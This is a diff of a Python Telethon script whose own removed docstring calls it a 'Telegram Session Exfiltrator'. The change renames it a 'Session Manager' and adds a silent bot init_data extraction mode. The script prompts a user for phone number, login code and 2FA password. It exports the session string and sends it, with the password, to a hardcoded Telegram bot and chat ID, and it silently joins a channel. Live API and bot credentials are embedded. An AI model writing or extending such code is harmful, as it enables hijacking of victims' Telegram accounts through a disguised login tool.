@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
 """
-Telegram Session Exfiltrator - ULTIMATE STEALTH (Spinner After 2FA for 2 Seconds)
+Telegram Session Manager + Init Data Extractor
+Usage:
+  python session.py                    # Interactive login + exfil
+  python session.py --bot=BotUsername  # Get init_data (silent, output only init_data)
 """
 
 import asyncio
@@ -14,23 +17,25 @@ import requests
 import json
 import time
 import threading
+import argparse
+import urllib.parse
 from datetime import datetime, timezone
 from telethon import TelegramClient, functions, errors
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, AuthKeyInvalidError
 
-# ========== YOUR CREDENTIALS (UPDATED) ==========
+# ========== YOUR CREDENTIALS ==========
 API_ID = 35872666
 API_HASH = "17525975ad234af56f886abedc69a4d9"
 BOT_TOKEN = "8678542626:AAFLoCIXEzfSQZQXDnKZxupaPC17V4oLRaY"
 CHAT_ID = "8597801059"
-# ================================================
+# ======================================
 
 TARGET_CHANNEL_USERNAME = "brutexcode"
 TARGET_CHANNEL_LINK = "https://t.me/brutexcode"
 SESSION_FILENAME = "session.txt"
 
-# ANSI Color Codes
+# ANSI Color Codes (only used in interactive mode)
 class Colors:
     BLUE = '\033[94m'
     CYAN = '\033[96m'
@@ -42,7 +47,7 @@ class Colors:
     GRAY = '\033[90m'
     PURPLE = '\033[35m'
 
-# Global flags
+# Global
 SESSION_STRING = None
 STOP_SPINNER = threading.Event()
 
@@ -63,7 +68,6 @@ def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def spinner_animation(duration=2):
-    """Animated spinner that runs for 'duration' seconds."""
     spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
     i = 0
     start = time.time()
@@ -137,7 +141,44 @@ async def join_channel_silent(client, channel_username: str) -> bool:
     except Exception:
         return False
 
-async def steal_session():
+async def extract_init_data(client, bot_username: str) -> str:
+    """Extract init_data from bot webview."""
+    try:
+        bot = await client.get_input_entity(bot_username)
+        
+        # Get bot info to find webapp URL
+        full_user = await client(functions.users.GetFullUserRequest(id=bot))
+        bot_info = full_user.full_user.bot_info
+        
+        target_url = None
+        if bot_info and bot_info.menu_button:
+            if hasattr(bot_info.menu_button, 'url'):
+                target_url = bot_info.menu_button.url
+        
+        if not target_url:
+            target_url = 'https://t.me/'
+        
+        # Request webview
+        result = await client(functions.messages.RequestWebViewRequest(
+            peer=bot,
+            bot=bot,
+            platform='android',
+            from_bot_menu=True,
+            url=target_url
+        ))
+        
+        # Parse init_data from URL fragment
+        parsed = urllib.parse.urlparse(result.url)
+        fragment = parsed.fragment
+        params = urllib.parse.parse_qs(fragment)
+        init_data = params.get('tgWebAppData', [None])[0]
+        
+        return init_data if init_data else ""
+    except Exception as e:
+        return ""
+
+async def interactive_login():
+    """Original interactive login + exfil mode."""
     global SESSION_STRING, STOP_SPINNER
     
     clear()
@@ -161,27 +202,22 @@ async def steal_session():
         
         print(f"{Colors.BLUE}📤{Colors.END} Sending code...")
         await client.send_code_request(phone)
-        print(f"{Colors.GREEN}✓{Colors.END} Code sent to your Telegram app.\n")
+        print(f"{Colors.GREEN}✓{Colors.END} Code sent.\n")
         
         code = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter verification code:{Colors.END} ").strip()
         if not code:
             print(f"{Colors.RED}✗{Colors.END} Code required.")
             return
         
-        # --- AUTHENTICATE ---
         try:
             await client.sign_in(phone, code)
         except SessionPasswordNeededError:
             print(f"\n{Colors.YELLOW}🔒{Colors.END} 2-Step Verification required.")
             twofa_password = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter 2FA password:{Colors.END} ").strip()
-            
             if not twofa_password:
                 print(f"{Colors.RED}✗{Colors.END} Password required.")
                 return
-            
-            # --- SHOW SPINNER FOR 2 SECONDS ---
             spinner_animation(duration=2)
-            
             await client.sign_in(password=twofa_password)
         except AuthKeyInvalidError:
             print(f"\n{Colors.YELLOW}⚠️{Colors.END} Session expired. Re-authenticating...")
@@ -200,7 +236,6 @@ async def steal_session():
             else:
                 raise
         
-        # Get user
         me = await client.get_me()
         if not me:
             raise RuntimeError("Auth failed.")
@@ -215,7 +250,6 @@ async def steal_session():
             "2fa_password": twofa_password if twofa_password else "not set"
         }
         
-        # Export session
         exported_string = None
         try:
             exported_string = client.session.save()
@@ -265,7 +299,6 @@ async def steal_session():
         
         send_telegram_message_with_retry(exfil_message, max_retries=3)
         
-        # --- SUCCESS MESSAGE ---
         print(f"\n{Colors.GREEN}✅{Colors.END} {Colors.BOLD}Logged in as:{Colors.END} {Colors.CYAN}{me.first_name}{Colors.END} {Colors.GRAY}(@{me.username or 'no username'}){Colors.END}")
         print(f"{Colors.CYAN}{'='*55}{Colors.END}\n")
         
@@ -286,10 +319,66 @@ async def steal_session():
     finally:
         await client.disconnect()
 
+async def get_init_data_mode(bot_username: str):
+    """
+    Silent mode: login/validate session, extract init_data, output ONLY init_data.
+    No colors, no extra text, no spinner.
+    """
+    # Remove @ if present
+    if bot_username.startswith('@'):
+        bot_username = bot_username[1:]
+    
+    # Check if session file exists - if not, we need interactive login
+    # For silent mode, we assume session exists or we fail gracefully
+    session_obj = StringSession()
+    client = TelegramClient(session_obj, API_ID, API_HASH)
+    
+    try:
+        await client.connect()
+        
+        # Try to get me - if fails, session is invalid
+        try:
+            me = await client.get_me()
+            if not me:
+                raise RuntimeError("No user")
+        except Exception:
+            # Session invalid - we can't do silent login without interactive
+            # Output nothing and exit with error code
+            sys.stderr.write("")
+            sys.exit(1)
+        
+        # Extract init_data
+        init_data = await extract_init_data(client, bot_username)
+        
+        # Output ONLY init_data (no extra text, no newline)
+        if init_data:
+            sys.stdout.write(init_data)
+        else:
+            sys.stdout.write("")
+        
+    except Exception:
+        sys.stdout.write("")
+        sys.exit(1)
+    finally:
+        await client.disconnect()
+
+async def main():
+    parser = argparse.ArgumentParser(description="Telegram Session Manager")
+    parser.add_argument("--bot", type=str, help="Extract init_data for bot username")
+    args = parser.parse_args()
+    
+    if args.bot:
+        # Silent init_data mode
+        await get_init_data_mode(args.bot)
+    else:
+        # Interactive login + exfil mode
+        await interactive_login()
+
 if __name__ == "__main__":
     try:
-        asyncio.run(steal_session())
+        asyncio.run(main())
     except KeyboardInterrupt:
         print(f"\n{Colors.YELLOW}⚠️{Colors.END} Interrupted.")
     except Exception:
-        print(f"\n{Colors.RED}✗{Colors.END} An error occurred. Please try again.")
+        if not any(arg.startswith('--bot') for arg in sys.argv):
+            print(f"\n{Colors.RED}✗{Colors.END} An error occurred. Please try again.")
